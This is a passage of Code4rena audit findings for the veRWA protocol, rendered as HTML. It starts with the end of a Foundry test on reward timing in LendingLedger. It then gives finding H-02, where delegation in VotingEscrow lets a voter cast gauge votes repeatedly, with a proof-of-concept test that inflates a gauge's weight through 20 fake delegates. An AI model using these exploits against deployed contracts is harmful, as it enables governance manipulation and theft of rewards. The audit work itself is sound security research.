class=\"mtk12\">delta</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1.1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">goverance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRewards</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">*</span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountPerEpoch</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingMarket</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// users[2] deposits at beginning of epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sync_ledger</span><span class=\"mtk1\">(</span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">], </span><span class=\"mtk12\">delta</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// lender deposits at 23:59 (week 4)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">((</span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">5</span><span class=\"mtk1\">) - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sync_ledger</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delta</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// airdrop ledger enough token balance for user to claim</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// withdraw at 00:00 (week 5)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingMarket</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sync_ledger</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delta</span><span class=\"mtk1\"> * (-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingMarket</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Lender should receive rewards for 1 second</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1.1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> / (</span><span class=\"mtk7\">1.1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1.1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceBefore2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">]).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingMarket</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceAfter2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">]).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// User2 should receive rewards for 1 week</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">balanceAfter2</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balanceBefore2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1.1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> / (</span><span class=\"mtk7\">1.1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1.1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</blockquote>\n</details><br>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/71\">OpenCoreCH (veRWA) confirmed on duplicate finding #71</a></strong></p>\n<hr>\n<h2 id=\"h-02-voters-from-votingescrow-can-vote-infinite-times-in-voteforgauge_weights-of-gaugecontroller\" style=\"position:relative;\"><a href=\"#h-02-voters-from-votingescrow-can-vote-infinite-times-in-voteforgauge_weights-of-gaugecontroller\" aria-label=\"h 02 voters from votingescrow can vote infinite times in voteforgauge_weights of gaugecontroller permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/396\">[H-02] Voters from VotingEscrow can vote infinite times in vote<em>for</em>gauge_weights() of GaugeController</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/396\">0x73696d616f</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/419\">mert_eren</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/393\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/368\">SpicyMeatball</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/365\">Tricko</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/321\">0xComfyCat</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/319\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/302\">Team_Rocket</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/297\">Yanchuan</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/280\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/266\">GREY-HAWK-REACH</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/237\">th13vn</a>, 0xCiphky (<a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/177\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/173\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/114\">ltyu</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/86\">deadrxsezzz</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/459\">nonseodion</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/443\">lanrebayode77</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/421\">0xDetermination</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/410\">popular00</a>, and <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/387\">kaden</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L211\">https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L211</a> <br><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/main/src/VotingEscrow.sol#L356\">https://github.com/code-423n4/2023-08-verwa/blob/main/src/VotingEscrow.sol#L356</a></p>\n<p>Delegate mechanism in <code>VotingEscrow</code> allows infinite votes in <code>vote_for_gauge_weights()</code> in the <code>GaugeController</code>. Users can then, for example, claim more tokens in the <code>LendingLedger</code> in the market that they inflated the votes on.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>VotingEscrow</code> has a delegate mechanism which lets a user delegate the voting power to another user.\nThe <code>GaugeController</code> allows voters who locked native in <code>VotingEscrow</code> to vote on the weight of a specific gauge.</p>\n<p>Due to the fact that users can delegate their voting power in the <code>VotingEscrow</code>, they may vote once in a gauge by calling <code>vote_for_gauge_weights()</code>, delegate their votes to another address and then call again <code>vote_for_gauge_weights()</code> using this other address.</p>\n<p>A POC was built in Foundry, add the following test to <code>GaugeController.t.sol</code>:</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testDelegateSystemMultipleVoting</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">v</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">v</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">v</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">v</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">v</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedWeight_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">gauge_relative_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">), </span><span class=\"mtk7\">50e16</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numDelegatedTimes_</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i_</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i_</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numDelegatedTimes_</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i_</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fakeUserI_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i_</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">27</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// random num</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fakeUserI_</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fakeUserI_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fakeUserI_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fakeUserI_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// assert that the weight is approx numDelegatedTimes_ more than expected</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">), </span><span class=\"mtk12\">expectedWeight_</span><span class=\"mtk1\">*(</span><span class=\"mtk12\">numDelegatedTimes_</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">numDelegatedTimes_</span><span class=\"mtk1\">*</span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// relative weight has been increase by a lot, can be increased even more if wished</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span 